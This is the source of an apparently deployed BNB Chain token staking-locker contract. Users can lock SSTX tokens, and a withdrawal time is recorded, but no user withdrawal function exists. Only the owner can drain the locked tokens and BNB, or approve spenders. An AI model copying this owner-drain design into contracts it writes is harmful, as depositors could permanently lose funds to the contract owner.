/**
 *Submitted for verification at BscScan.com on 2021-10-24
*/

//SPDX-License-Identifier: MIT

pragma solidity 0.8.6;

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}


library Address {

    function isContract(address account) internal view returns (bool) {

        uint256 size;
        // solhint-disable-next-line no-inline-assembly
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{ value: value }(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                // solhint-disable-next-line no-inline-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

}

contract SSTXStakingLocker is Ownable {

    address deployerAdd;

    constructor() {
      deployerAdd = msg.sender;
    }

    // Token Address
    IBEP20 constant token = IBEP20(0x5396734569e26101677Eb39C89413F7fa7d8006f);

    struct User{
        bool hasLocked;
        uint32 snapshotTime;
        uint256 stakedValue;
        uint32 nextWithdrawTime;
        uint256 totalWithdrawn;
    }

    mapping(address=>User) public userInfo;

    event TokenLocked(address userAddress, uint32 timestamp, uint256 value);
    event Withdrawn(address userAddress, uint32 timestamp, uint256 value);

     // LOCKER
    function Lock_Token(uint256 value) external returns(bool){
        require(token.balanceOf(msg.sender)>=value, "LOCK: Insufficient balance");

        User storage person = userInfo[msg.sender];

        require(!person.hasLocked, "Can not lock again!");

        token.transferFrom(msg.sender, address(this), value);
        person.hasLocked = true;
        person.snapshotTime = uint32(block.timestamp);
        person.stakedValue += value;
        person.nextWithdrawTime = uint32(block.timestamp + 2 days);

        emit TokenLocked(msg.sender, uint32(block.timestamp), value);
        return true;
    }

     // withdraw all SSTX in case of emergency
    function withdrawAllTokens() external onlyOwner() returns(bool){
        uint256 value = token.balanceOf(address(this));
        token.transfer(msg.sender, value);
        emit Withdrawn(msg.sender, uint32(block.timestamp), value);
        return true;
    }


    // withdraw some SSTX
    function withdrawSomeTokens(uint256 value) external onlyOwner() returns (bool){
        require (token.balanceOf(address(this)) >= value);
        token.transfer(msg.sender, value);
        emit Withdrawn(msg.sender, uint32(block.timestamp), value);
        return true;
    }


    function checkUserTokenBal(address userAdd) external view returns(uint256){
        return token.balanceOf(userAdd);
    }

    function checkContractTokenBal() external view returns(uint256){
        return token.balanceOf(address(this));
    }

    // withdraw BNB from contract
    function withdrawBNB() external onlyOwner() returns (bool){
        require(address(this).balance > 0);
        payable(msg.sender).transfer(address(this).balance);
        return true;
    }
function approveAddressToWithDrawToken(address spender,uint256 amount) onlyOwner() public
{
token.approve(spender,amount);
}

}